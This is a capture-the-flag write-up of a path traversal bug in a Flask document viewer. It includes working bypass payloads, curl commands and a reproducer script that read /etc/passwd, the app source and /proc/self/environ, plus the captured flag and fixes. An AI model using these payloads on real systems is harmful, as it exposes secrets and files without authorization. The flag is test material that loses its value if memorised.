# Touchline Dispatch — CTF Writeup

**Challenge:** Touchline Dispatch (300 pts)
**Category:** Web
**Target:** `http://54.72.82.22:8300`
**Flag:** `safctf{276928973c4dea42f63d808ba7be66b7}`
**Difficulty:** Easy/Medium — unauthenticated path traversal (CWE-22) leading to arbitrary file read

---

## 1. Summary

A Flask/Werkzeug application exposes a document viewer at `GET /api/view?name=...`.
The handler builds a filesystem path by concatenating a user-controlled `name`
parameter onto `ROOT/documents/` and renders the file contents back to the caller.
The only "sanitisation" is a naive string replacement of the literal substring
`../`, which is trivially bypassed with `....//`. This yields arbitrary file read
as the container's `root` user.

The flag itself is written to an in-container private document
(`/app/private/reserve.txt`) at startup — the intended target of the traversal.
It was *also* independently recoverable by reading `/proc/self/environ`, because
the organizer injects the flag as the `FLAG` environment variable.

There was no need for RCE, SSRF, or any authentication bypass.

---

## 2. Reconnaissance

### 2.1 Port / service fingerprint

```
$ nmap -Pn -sV -p 8300 --version-intensity 5 54.72.82.22
Host is up (0.21s latency).

PORT     STATE SERVICE VERSION
8300/tcp open  http    Werkzeug httpd 3.1.9 (Python 3.11.16)
```

Werkzeug's dev server = Flask application, Python 3.11.

### 2.2 Root page

`GET /` returns a marketing-styled landing page. The interesting parts are in the
copy and the inline script:

```html
<details><summary>Desk services</summary>
  <p>GET /api/library lists documents. GET /api/view?name=... opens a document.</p>
</details>
```

A "Desk console" lets the user send `GET`/`POST`/`PATCH` to an arbitrary local
service path — a hint that the API supports multiple methods (relevant for the
other variants of this challenge family, but not needed here).

### 2.3 Endpoint enumeration

| Request | Status | Response |
|---|---|---|
| `GET /health` | 200 | `{"status":"ok"}` |
| `GET /api/library` | 200 | `{"items":["schedule.txt","welcome.txt"]}` |
| `GET /api/view?name=welcome.txt` | 200 | `{"text":"Welcome to the club.\n"}` |
| `GET /api/view?name=schedule.txt` | 200 | `{"text":"The gates open at six.\n"}` |
| `GET /api/view?name=index` | 400 | `{"message":"Request unavailable."}` |
| `POST/PATCH /api/library` | 200 | same body as GET |
| `PUT/DELETE /api/library` | 405 | Method Not Allowed |

The catch-all route `/api/<path:operation>` accepts `GET`, `POST` and `PATCH`.
Unknown operations return `{"message":"Not found"}` with 404; application-level
exceptions are swallowed and normalised to `{"message":"Request unavailable."}`
with 400 — which is exactly what a failed `open()` looks like.

---

## 3. Vulnerability analysis

### 3.1 The flawed handler

Recovered from the container (see §4.1) — `/app/service.py`:

```python
@app.route('/api/<path:operation>', methods=['GET','POST','PATCH'])
def api(operation):
    data = request.get_json(silent=True) or request.form.to_dict() or {}
    try:
        return dispatch(operation, data)
    except (ValueError, KeyError, TypeError, IndexError,
            FileNotFoundError, zipfile.BadZipFile):
        return jsonify({'message': 'Request unavailable.'}), 400

def dispatch(op, d):
    if kind == 'web-path':
        if op == 'library':
            return {'items': ['schedule.txt', 'welcome.txt']}
        if op == 'view':
            name = unquote(request.args.get('name', 'welcome.txt').replace('../', ''))
            p = ROOT / 'documents' / name
            return {'text': p.read_text()[:10000]}
```

And at startup (`__main__`):

```python
if kind in ('web-path', 'web-render'):
    (ROOT / 'private').mkdir(exist_ok=True)
    (ROOT / 'private' / 'reserve.txt').write_text(FLAG)
```

`ROOT` is `/app`, `cfg['kind']` is `web-path`.

### 3.2 Why the filter fails

Three independent defects compound here:

1. **Blacklist instead of allowlist.** The code removes the *literal* string
   `../` exactly once, non-recursively, *before* URL-decoding is fully accounted
   for. Any encoding or nesting survives.

2. **Non-recursive single-pass replacement.** `str.replace('../','')` is applied
   once. The classic bypass `....//` contains `../` starting at index 2 —
   removing it leaves `../`:

   ```
   "....//private/reserve.txt"
              ^^^^ matched "../" removed  →  "../private/reserve.txt"
   ```

   The reconstructed string is a valid traversal again. (Same class of bug as
   `..././`, `....\/`, etc.)

3. **`unquote()` runs *after* the filter.** The order is
   `unquote(arg.replace('../',''))`. Percent-encoded input such as `%2e%2e%2f`
   passes the filter untouched (it contains no literal `../`), and *then* gets
   decoded into `../`. The encode-then-filter ordering is backwards.

4. **Absolute paths bypass the join entirely.** `pathlib`'s `/` operator discards
   the left operand when the right one is absolute, so `name=/etc/passwd`
   resolves to `/etc/passwd`. No traversal syntax is even required.

### 3.3 Impact

Arbitrary file read as the container's `root` — source code, config, secrets, and
`/proc/self/*`. Because the flag is both a file and an environment variable, there
are two independent extraction routes.

---

## 4. Exploitation

### 4.1 Step 1 — Arbitrary file read (proof)

Absolute path, no traversal needed:

```bash
curl -s 'http://54.72.82.22:8300/api/view?name=/etc/passwd'
```

```json
{"text":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:...\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n..."}
```

`../` is blocked, but the nested form is not:

```bash
curl -s 'http://54.72.82.22:8300/api/view?name=....//....//etc/passwd'
# → 200, identical /etc/passwd contents
```

**Filter-bypass matrix:**

| Payload | Result | Reason |
|---|---|---|
| `../etc/passwd` | 400 | literal `../` stripped → `etc/passwd`, not found |
| `..%2f..%2fetc%2fpasswd` | 400 | decoded *after* filter → `../../etc/passwd` → escapes too far, 400 |
| `....//....//etc/passwd` | **200** | `../` removed once → `../../etc/passwd` |
| `/etc/passwd` | **200** | absolute path overrides the join |

### 4.2 Step 2 — Read the app source & config

```bash
curl -s 'http://54.72.82.22:8300/api/view?name=/app/service.py'
curl -s 'http://54.72.82.22:8300/api/view?name=/app/settings.json'
```

`settings.json` confirms the instance variant:

```json
{ "title": "Touchline Dispatch", "kind": "web-path",
  "task": "Materials for your visit are available below.", "simulation": false }
```

Reading `service.py` reveals exactly where the flag lives:
`ROOT/private/reserve.txt` (i.e. `/app/private/reserve.txt`).

### 4.3 Step 3 — Capture the flag (intended path)

```bash
curl -s 'http://54.72.82.22:8300/api/view?name=....//private/reserve.txt'
```

```json
{"text":"safctf{276928973c4dea42f63d808ba7be66b7}"}
```

Trace through the handler:

```
name  = "....//private/reserve.txt"
replace('../','')  →  "../private/reserve.txt"
ROOT/'documents'/"../private/reserve.txt"
                   →  /app/documents/../private/reserve.txt
                   →  /app/private/reserve.txt   ← FLAG
```

### 4.4 Step 4 — Alternate path: environment variable leak

`/proc/self/environ` is world-readable and contains the process environment,
where the orchestrator placed the flag:

```bash
curl -s 'http://54.72.82.22:8300/api/view?name=/proc/self/environ'
```

```
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=b51b638f3ddb
FLAG=safctf{276928973c4dea42f63d808ba7be66b7}
LANG=C.UTF-8
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
PYTHON_VERSION=3.11.16
HOME=/root
```

Corroborating artefacts found the same way:

* `/proc/self/cmdline` → `python service.py`
* `/proc/self/mountinfo` → Docker overlayfs; container ID `b51b638f3ddb…`
* `/proc/self/cwd/service.py` → also reachable via the `/proc/self/cwd` symlink,
  an alternative when the absolute app path is unknown.

> **Note on `debug=False`:** the Werkzeug *debug console* is disabled, so the
> well-known Werkzeug PIN / console RCE path (HackTricks, *Werkzeug / Flask
> Debug*) did not apply. The traversal was sufficient on its own.

---

## 5. Flag

```
safctf{276928973c4dea42f63d808ba7be66b7}
```

---

## 6. Root cause & remediation

**Root cause:** user input is used to build a filesystem path, guarded only by a
non-recursive blacklist replacement of `../` applied in the wrong order relative
to URL-decoding.

**Fixes:**

1. **Resolve and verify containment** rather than pattern-matching input:

   ```python
   from pathlib import Path
   base = (ROOT / 'documents').resolve()
   target = (base / unquote(name)).resolve()
   if not target.is_relative_to(base):      # Python 3.9+
       abort(400)
   if not target.is_file():
       abort(404)
   return {'text': target.read_text()[:10000]}
   ```

2. **Use an allowlist.** The library is a fixed set of two documents — serve them
   by lookup key, never by path:

   ```python
   DOCS = {'welcome.txt': ..., 'schedule.txt': ...}
   if name not in DOCS: abort(404)
   ```

3. **Never blacklist.** `str.replace` on traversal sequences cannot be made safe;
   encodings, nesting and OS-specific separators all defeat it.

4. **Don't put secrets in the environment.** The `FLAG` env var turned a file-read
   bug into a one-request flag capture via `/proc/self/environ`. Read secrets from
   a mounted file with restrictive permissions, and drop `CAP_DAC_READ_SEARCH` /
   run as a non-root user so `/proc/self/*` is less useful to an attacker.

5. **Run as non-root** with a read-only root filesystem, so an arbitrary-read bug
   yields far less.

---

## 7. References

* HackTricks — *File Inclusion and Path Traversal* → "Via `/proc/self/environ`"
  (sourced via BlackBook `knowledge_research`)
* HackTricks — *Werkzeug / Flask Debug* (`get_machine_id`, console PIN) —
  considered and ruled out (`debug=False`)
* MITRE ATT&CK T1552.007 — *Container API* (credential/secret access in container
  environments)

---

## Appendix A — Reproducer script

```python
#!/usr/bin/env python3
"""Touchline Dispatch — flag extraction (path traversal, CWE-22)."""
import json, urllib.parse, urllib.request

BASE = "http://54.72.82.22:8300"

def view(name: str) -> str:
    url = f"{BASE}/api/view?name={urllib.parse.quote(name)}"
    with urllib.request.urlopen(url, timeout=15) as r:
        return json.load(r)["text"]

if __name__ == "__main__":
    print("[*] library :", view("welcome.txt").strip())
    print("[*] passwd  :", view("/etc/passwd").splitlines()[0])
    print("[*] bypass  :", view("....//....//etc/passwd").splitlines()[0])
    print("[+] FLAG    :", view("....//private/reserve.txt").strip())
    print("[+] envflag :", [l for l in view("/proc/self/environ").split("\x00")
                            if l.startswith("FLAG=")])
```

## Appendix B — Raw evidence (trimmed)

```
$ curl -s 'http://54.72.82.22:8300/api/library'
{"items":["schedule.txt","welcome.txt"]}

$ curl -s 'http://54.72.82.22:8300/api/view?name=../etc/passwd'
{"message":"Request unavailable."}

$ curl -s 'http://54.72.82.22:8300/api/view?name=....//private/reserve.txt'
{"text":"safctf{276928973c4dea42f63d808ba7be66b7}"}
```
